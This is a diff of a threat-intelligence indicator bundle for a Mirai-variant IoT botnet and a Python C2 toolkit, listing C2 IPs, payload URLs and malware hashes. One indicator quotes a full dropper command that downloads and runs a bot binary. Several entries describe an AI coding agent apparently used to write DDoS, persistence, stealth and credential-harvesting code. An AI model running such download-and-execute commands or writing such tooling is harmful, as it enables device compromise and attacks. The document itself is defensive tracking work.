@@ -1,6 +1,6 @@
 {
     "type": "bundle",
-    "id": "bundle--1b09f678-022b-4fcf-982c-ad9fcb5e1ca3",
+    "id": "bundle--f50973e4-5536-4a6a-bc42-ac574cc21f22",
     "objects": [
         {
             "type": "identity",
@@ -34,7 +34,7 @@
             "id": "indicator--cdf8c0d6-6aa3-532e-8abf-bb23054c5f1d",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.176736Z",
-            "modified": "2026-10-01T19:54:19.176736Z",
+            "modified": "2026-10-17T16:28:36.41559Z",
             "name": "ipv4: 165.227.175.161",
             "description": "Parasitic Naku CNC on COMPROMISED GetYourGroup tourism VPS (DigitalOcean US allocation 165.227.0.0/16). TCP/23 daemon planted on legitimate Ubuntu 18.04 + OpenSSH 7.6p1 + MariaDB 10.2.44 + RunCloud-managed production VPS hosting auvergne-rhone-alpes-for-groups.com tourism domain. CNC IP hardcoded inline in Naku.arm main() as 0xa1afe3a5. False_positive_risk: HIGH (legitimate tourism VPS, coordinate with GetYourGroup BEFORE any takedown).",
             "indicator_types": [
@@ -49,6 +49,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "IPv4-Addr",
             "x_opencti_score": 95
         },
         {
@@ -63,7 +64,7 @@
             "id": "indicator--5722181f-9fb4-51ae-8ba4-a415b9f0e834",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.179469Z",
-            "modified": "2026-10-01T19:54:19.179469Z",
+            "modified": "2026-10-17T16:28:36.416146Z",
             "name": "ipv4: 188.166.194.243",
             "description": "DEFENDER CONTEXT, NOT operator-controlled. Shares all 3 SSH host keys with 165.227.175.161 due to RunCloud snapshot-deploy pattern. Hosts 28 GetYourGroup tourism domains including getyourgroup.de, france-for-groups.com, occitanie-for-groups.com, paris-region-for-groups.com. NO port 23 listener. Include as defender-context to prevent false-positive blocking of clean GetYourGroup sibling VPS. false_positive_risk: DEFINITE.",
             "indicator_types": [
@@ -78,6 +79,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "IPv4-Addr",
             "x_opencti_score": 60
         },
         {
@@ -92,7 +94,7 @@
             "id": "indicator--8737e33a-5b28-547f-baaf-be90b91aa2f8",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.17998Z",
-            "modified": "2026-10-01T19:54:19.17998Z",
+            "modified": "2026-10-17T16:28:36.416596Z",
             "name": "ipv4: 80.211.111.10",
             "description": "Aruba S.p.A. Italy sibling distribution server (ASN AS31034). Embedded in all 11 Naku binaries alongside .94.16. VT 0/55 (clean reputation = burning-fuse). Currently DARK on all 40 ports tested as of 2026-05-24.",
             "indicator_types": [
@@ -107,6 +109,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "IPv4-Addr",
             "x_opencti_score": 80
         },
         {
@@ -121,7 +124,7 @@
             "id": "indicator--b4313750-aee2-5fc7-92a7-1a89e3d1dd2f",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.180418Z",
-            "modified": "2026-10-01T19:54:19.180418Z",
+            "modified": "2026-10-17T16:28:36.416974Z",
             "name": "ipv4: 80.211.94.16",
             "description": "Aruba S.p.A. Italy distribution server (ASN AS31034). Embedded plaintext in all 11 Naku binaries as 'http://80.211.94.16/Naku.mips'. VT 5/56 detections. Currently OFFLINE as of 2026-05-24 (ACL asymmetry suggests targeted filtering policy). Burning-fuse OPSEC pattern.",
             "indicator_types": [
@@ -136,6 +139,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "IPv4-Addr",
             "x_opencti_score": 95
         },
         {
@@ -150,7 +154,7 @@
             "id": "indicator--32bf839a-9a7a-5a3f-816e-5d26483fa081",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.180764Z",
-            "modified": "2026-10-01T19:54:19.180764Z",
+            "modified": "2026-10-17T16:28:36.417354Z",
             "name": "ipv4: 87.106.143.220",
             "description": "Operator-OWNED primary IONOS DE VPS. Hosts Matrix C2 framework C2 on TCP/1337 + bot.sh distribution on HTTP/80 + Naku binary HTTPS-channel test on /bins/Naku.*/443 + Pandora HTTP-channel deploy on /Pandoras_Box/Pandora.*/80 + .rovodev/ AI authoring session directory + 22+ AI-generated handoff documents.",
             "indicator_types": [
@@ -165,6 +169,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "IPv4-Addr",
             "x_opencti_score": 95
         },
         {
@@ -179,7 +184,7 @@
             "id": "indicator--768f0cb9-19e4-5bda-9830-8d87db5c607d",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.181127Z",
-            "modified": "2026-10-01T19:54:19.181127Z",
+            "modified": "2026-10-17T16:28:36.417745Z",
             "name": "ipv4: 87.106.54.213",
             "description": "Operator-OWNED backup IONOS DE VPS (same /16 as primary). Referenced in IMPLEMENTATION_PLAN.txt Phase 2 for dual scanning + 1000+/day infection rate target.",
             "indicator_types": [
@@ -194,6 +199,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "IPv4-Addr",
             "x_opencti_score": 95
         },
         {
@@ -208,7 +214,7 @@
             "id": "indicator--b128780c-e2b5-5998-9956-641264f20055",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.181457Z",
-            "modified": "2026-10-01T19:54:19.181457Z",
+            "modified": "2026-10-17T16:28:36.418216Z",
             "name": "url: http://80.211.94.16/Naku.mips",
             "description": "Distribution URL embedded plaintext in Naku.arm exploit payload (CVE-2014-8361 Realtek + CVE-2017-17215 Huawei droppers). Full payload: 'cd /var; rm -rf nig; wget http://80.211.94.16/Naku.mips -O nig; chmod 777 nig; ./nig realtek'.",
             "indicator_types": [
@@ -223,6 +229,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "Url",
             "x_opencti_score": 95
         },
         {
@@ -237,7 +244,7 @@
             "id": "indicator--ba38d13b-6806-5a58-aaaa-41d9be22ba5f",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.182272Z",
-            "modified": "2026-10-01T19:54:19.182272Z",
+            "modified": "2026-10-17T16:28:36.418616Z",
             "name": "url: http://87.106.143.220/bot.sh",
             "description": "Persistence-reseed URL embedded in all 5 persistence vectors of persistent_bot.sh. Operator pushes updated bot binaries by replacing bot.sh on the IONOS VPS; all infected hosts re-download on next cron/login/restart.",
             "indicator_types": [
@@ -252,6 +259,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "Url",
             "x_opencti_score": 95
         },
         {
@@ -268,7 +276,7 @@
             "id": "indicator--12e844b5-16cf-584c-8e52-c26622bef2d6",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.182774Z",
-            "modified": "2026-10-01T19:54:19.182774Z",
+            "modified": "2026-10-17T16:28:36.41906Z",
             "name": "sha256: 0c77fee765a40486c396e9b14f6eb9a787c4c5d9261669b60ab35fed7fe1a626",
             "description": "Naku.x86, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!MTB. Recommended for binary disassembly (universally tooled x86 disassembly).",
             "indicator_types": [
@@ -283,6 +291,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -323,7 +332,7 @@
             "id": "indicator--bb4bd80d-2ce8-5d20-91ed-d048c70ce2f4",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.184237Z",
-            "modified": "2026-10-01T19:54:19.184237Z",
+            "modified": "2026-10-17T16:28:36.419836Z",
             "name": "sha256: 4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b",
             "description": "matrix/bot.sh + matrix/payloads/persistent_bot.sh (same SHA), 5-vector Linux persistence installer (cron + rc.local + init.d + systemd + .bashrc/.profile). AI-authored via Rovodev. JSON-over-TCP/1337 wire protocol.",
             "indicator_types": [
@@ -338,6 +347,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -370,7 +380,7 @@
             "id": "indicator--668538c9-ab04-5b1e-a503-3e2dfd859f97",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.184866Z",
-            "modified": "2026-10-01T19:54:19.184866Z",
+            "modified": "2026-10-17T16:28:36.420531Z",
             "name": "sha256: 595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a",
             "description": "Naku.arm7, Pandora-Mirai variant DEBUG BUILD (139.5 KB; 710 strings). VT 39/65. Retains canonical Mirai source-tree symbols (attack_method.c / killer.c / telnet.c / table.c / util.c / rand.c / resolv.c + resolve_cnc_addr + auth_table + add_auth_entry) cross-compiled via Rob Landley aboriginal toolchain.",
             "indicator_types": [
@@ -385,6 +395,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -409,7 +420,7 @@
             "id": "indicator--45e08149-7ac9-5e5f-85aa-cd33ce4b0e0e",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.18539Z",
-            "modified": "2026-10-01T19:54:19.18539Z",
+            "modified": "2026-10-17T16:28:36.421108Z",
             "name": "sha256: 64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383",
             "description": "Naku.arm, Pandora-Mirai 11-arch IoT botnet bot binary. VT 43/66. Microsoft Mirai.AW!xp. Universal MAL_ELF_LNX_Mirai_Oct10_1 YARA. Operator-bespoke XOR-0x54 string obfuscation + 22-char charset 1gba4cdom53nhp12ei0kfj.",
             "indicator_types": [
@@ -424,6 +435,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -440,7 +452,7 @@
             "id": "indicator--8d7a6416-59fa-54ff-b023-7be84e2fa3fb",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.185825Z",
-            "modified": "2026-10-01T19:54:19.185825Z",
+            "modified": "2026-10-17T16:28:36.421574Z",
             "name": "sha256: 64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260",
             "description": "matrix/bots/mirai_clone.py, Python Mirai-style standalone bot (conceptual Mirai-clone). AI-authored via Rovodev. 5/5 AI-Generated Code Signature match (verbose docstrings + defensive try/except + educational variable names + zero anti-analysis + AI-grade rate limiting). Reports to 87.106.143.220:1337 via pipe-delimited TCP.",
             "indicator_types": [
@@ -455,6 +467,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -487,7 +500,7 @@
             "id": "indicator--eae8b01b-12e2-53d0-8086-463ccacf210d",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.186395Z",
-            "modified": "2026-10-01T19:54:19.186395Z",
+            "modified": "2026-10-17T16:28:36.422235Z",
             "name": "sha256: 81748f0236319c678db39945ec77fffe1b33e84ffa9731b2836b911f8e83a5cc",
             "description": "Rovodev session_context.json (257b6faf session, 1.24 MB), DIRECT AI-AUTHORING EVIDENCE; captures file_write tool calls with initial_content payloads creating master_control.py + attack_engine.py + multi_vector_agent.py + encrypted_agent.py + stealth_agent.py.",
             "indicator_types": [
@@ -502,6 +515,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -518,7 +532,7 @@
             "id": "indicator--52e696b3-871b-57f0-b29e-03a290c61dbb",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.186781Z",
-            "modified": "2026-10-01T19:54:19.186781Z",
+            "modified": "2026-10-17T16:28:36.422702Z",
             "name": "sha256: 8aca22aa0fc77775521eaa916f490d7a433fd8f0c0f8104bb113f6127be0e530",
             "description": "Naku.sh4, Pandora-Mirai variant with Gafgyt cross-detection (Microsoft Backdoor:Linux/Gafgyt.P!MTB). VT 43/65. Supports Xbash-hybrid lineage hypothesis.",
             "indicator_types": [
@@ -533,6 +547,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -549,7 +564,7 @@
             "id": "indicator--67d16aa4-60f8-5825-bf58-e1ec29eafb0b",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.187173Z",
-            "modified": "2026-10-01T19:54:19.187173Z",
+            "modified": "2026-10-17T16:28:36.423184Z",
             "name": "sha256: 921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09",
             "description": "attack_engine.py, Matrix C2 multi-protocol DDoS engine. AI-authored via Rovodev. scapy-based UDP/TCP/ICMP floods with source-IP spoofing. Operator self-marketing comment: '# Increased default threads for 50Gbps+'. Method dispatch shows tier-bleed (udp-star/udp-bypass both → udp_flood).",
             "indicator_types": [
@@ -564,6 +579,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -588,7 +604,7 @@
             "id": "indicator--f0e65d04-21b2-5c35-b6bd-03929fa608ca",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.187693Z",
-            "modified": "2026-10-01T19:54:19.187693Z",
+            "modified": "2026-10-17T16:28:36.424078Z",
             "name": "sha256: 9e70449b2aafc71c7ff16ece42053fb41b92394cdb88ce799f60d50b4fbefa9e",
             "description": "encrypted_agent.py, Matrix C2 encrypted agent with AES-256-GCM + PBKDF2 + handshake. AI-authored via Rovodev (captured in session_context.json file_write tool call).",
             "indicator_types": [
@@ -603,6 +619,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -619,7 +636,7 @@
             "id": "indicator--3caf9842-74d2-54be-830e-279641463f85",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.188095Z",
-            "modified": "2026-10-01T19:54:19.188095Z",
+            "modified": "2026-10-17T16:28:36.424635Z",
             "name": "sha256: 9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa",
             "description": "Rovodev session_context.json (8b911ec6 session, 176 KB), SECOND distinct AI-authoring session. Captures DDoS-as-a-Service tier model JavaScript catalog (VIP/free tiers, GBPS estimates, emoji branding 🔥🚀) + SQL data-load tuple list with schema (method_name, layer_tier, description, power_multiplier, access_tier).",
             "indicator_types": [
@@ -634,6 +651,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -650,7 +668,7 @@
             "id": "indicator--251d96df-50fa-59f5-8c38-9d118063ab2b",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.188492Z",
-            "modified": "2026-10-01T19:54:19.188492Z",
+            "modified": "2026-10-17T16:28:36.42512Z",
             "name": "sha256: a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2",
             "description": "multi_vector_agent.py, Matrix C2 dispatcher. AI-authored via Rovodev. Hunt classifier flags 'Source representation shows indentation/formatting issues likely from copy/paste' (Copy-Paste Indentation Decay sub-pattern #7) + Name/Implementation Mismatch bug (launch_udp_flood calls http_flood.py).",
             "indicator_types": [
@@ -665,6 +683,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -681,7 +700,7 @@
             "id": "indicator--f3018267-421c-5c53-8002-307a664afe58",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.188939Z",
-            "modified": "2026-10-01T19:54:19.188939Z",
+            "modified": "2026-10-17T16:28:36.425569Z",
             "name": "sha256: afd49e3ceb20a8e861fa4804b6ea988f8aefd6942f84973f32b8e24c7df03410",
             "description": "Naku.mips, Pandora-Mirai variant. VT 41/64. Microsoft Mirai.FC!MTB.",
             "indicator_types": [
@@ -696,6 +715,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -712,7 +732,7 @@
             "id": "indicator--ccea46d2-2993-52e4-a4b7-47fd822f3f79",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.18932Z",
-            "modified": "2026-10-01T19:54:19.18932Z",
+            "modified": "2026-10-17T16:28:36.42605Z",
             "name": "sha256: b7d999255a12da91f23453ec940cdc52b64e59c6e205f227ceae98a83027de20",
             "description": "Naku.arm6, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!xp.",
             "indicator_types": [
@@ -727,6 +747,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -751,7 +772,7 @@
             "id": "indicator--cf770c04-8077-5831-8a34-3856e3734c20",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.190125Z",
-            "modified": "2026-10-01T19:54:19.190125Z",
+            "modified": "2026-10-17T16:28:36.426619Z",
             "name": "sha256: d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3",
             "description": "stealth_agent.py, Matrix C2 stealth agent with anti-debug + anti-VM + sandbox checks + process hiding + simple rootkit + systemd/cron persistence + self-destruct + polymorphic payload. AI-authored via ESCALATED prompt (refines AI-Generated Code Signature item #4 from structural to prompt-conditional).",
             "indicator_types": [
@@ -766,6 +787,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -782,7 +804,7 @@
             "id": "indicator--752fd330-6706-51cd-9388-18f058ef0f74",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.190562Z",
-            "modified": "2026-10-01T19:54:19.190562Z",
+            "modified": "2026-10-17T16:28:36.427079Z",
             "name": "sha256: d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17",
             "description": "pandora.sh, HTTP:80 campaign-channel dropper. VT 17/66. Execution_parent of all 11 Naku binaries per VT. Victim-facing deployment via HTTP (many IoT victims don't support HTTPS).",
             "indicator_types": [
@@ -797,6 +819,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -813,7 +836,7 @@
             "id": "indicator--6dd72edc-d426-59e0-bfa6-786fd09c7066",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.190996Z",
-            "modified": "2026-10-01T19:54:19.190996Z",
+            "modified": "2026-10-17T16:28:36.427538Z",
             "name": "sha256: d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0",
             "description": "Rovodev rovodev.log (8.5 MB), Rovodev CLI runtime log including the Discord-bot JavaScript attack-method dispatch table (13+ attack methods catalog).",
             "indicator_types": [
@@ -828,6 +851,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -852,7 +876,7 @@
             "id": "indicator--8f837c37-150c-5e17-b85e-27d954ee8430",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.191458Z",
-            "modified": "2026-10-01T19:54:19.191458Z",
+            "modified": "2026-10-17T16:28:36.428098Z",
             "name": "sha256: e4d3d361ba8b25f8effcf7786b32185cf7255059fcf55b2509101779703a15aa",
             "description": "Naku.arm5, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!xp.",
             "indicator_types": [
@@ -867,6 +891,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -883,7 +908,7 @@
             "id": "indicator--ff494eb7-7965-5ae9-8ae6-7727f8d9d55a",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.191975Z",
-            "modified": "2026-10-01T19:54:19.191975Z",
+            "modified": "2026-10-17T16:28:36.428557Z",
             "name": "sha256: e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e",
             "description": "master_control.py, Matrix C2 orchestrator. AI-authored via Atlassian Rovodev (captured in session_context.json file_write tool call). Spawns multi_vector_agent.py + socks5_manager.py + backup-VPS deployment workflow.",
             "indicator_types": [
@@ -898,6 +923,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -914,7 +940,7 @@
             "id": "indicator--efc3a16c-5802-58c5-a7c0-4b8d08357547",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.192386Z",
-            "modified": "2026-10-01T19:54:19.192386Z",
+            "modified": "2026-10-17T16:28:36.42903Z",
             "name": "sha256: ec948aef742c01f91b41df9b19b0ecca3bc8ecf962e2360aee181b9b89abfc78",
             "description": "Naku.spc, Pandora-Mirai variant. VT 41/66. Microsoft Mirai.FG!MTB. VT-named /tmp/pandora_bot, DEFINITIVE Naku ≡ Pandora identity reconciliation; pandora.sh dropper SHA d3fd9994... as execution_parent.",
             "indicator_types": [
@@ -929,6 +955,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -945,7 +972,7 @@
             "id": "indicator--12ab0f05-aa85-5c82-9ebe-87fad88050eb",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.192824Z",
-            "modified": "2026-10-01T19:54:19.192824Z",
+            "modified": "2026-10-17T16:28:36.429502Z",
             "name": "sha256: ee24f4f0fb9795bca8daba73f99bf1846fe5cdb400f5345ef4a4476b20ab5bc4",
             "description": "Naku.m68k, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.BO!xp.",
             "indicator_types": [
@@ -960,6 +987,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -976,7 +1004,7 @@
             "id": "indicator--0c7f700f-207c-52eb-b9a4-1da7ab6c0cea",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.193222Z",
-            "modified": "2026-10-01T19:54:19.193222Z",
+            "modified": "2026-10-17T16:28:36.429979Z",
             "name": "sha256: ef693f29b4ae47b1aa5920237946c3b0518ce84dd37e6fd6c6ee2e3e9dd6cd44",
             "description": "Naku.mpsl, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.DY!MTB.",
             "indicator_types": [
@@ -991,6 +1019,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -1015,7 +1044,7 @@
             "id": "indicator--e1b7710d-03f6-5fb4-8823-60fdacc4f3a8",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.193673Z",
-            "modified": "2026-10-01T19:54:19.193673Z",
+            "modified": "2026-10-17T16:28:36.430486Z",
             "name": "sha256: f90658253261f8dc63446dac49a88baa0742f46a2f5448fb330acb58017980ef",
             "description": "Naku.ppc, Pandora-Mirai variant. VT 42/65. Microsoft Mirai.BL!xp.",
             "indicator_types": [
@@ -1030,6 +1059,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
@@ -1046,7 +1076,7 @@
             "id": "indicator--7f1f011b-a5e3-5390-9197-47506c84c148",
             "created_by_ref": "identity--8bc8284b-deb5-546c-a233-57ea34b2ea0d",
             "created": "2026-10-01T19:54:19.194166Z",
-            "modified": "2026-10-01T19:54:19.194166Z",
+            "modified": "2026-10-17T16:28:36.430964Z",
             "name": "sha256: fba4072941038d27a28a1089ab24d9c3e22f0db19994f3c12c688085903a6ded",
             "description": "matrix/bots/web_scraper_bot.py, Python BFS depth-3 credential/secret harvester. AI-authored via Rovodev. 5/5 AI-Generated Code Signature match. Extracts AWS keys / GitHub PATs / Slack tokens / Stripe sk_live keys from victim HTML.",
             "indicator_types": [
@@ -1061,6 +1091,7 @@
                 "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
             ],
             "x_opencti_detection": false,
+            "x_opencti_main_observable_type": "StixFile",
             "x_opencti_score": 95
         },
         {
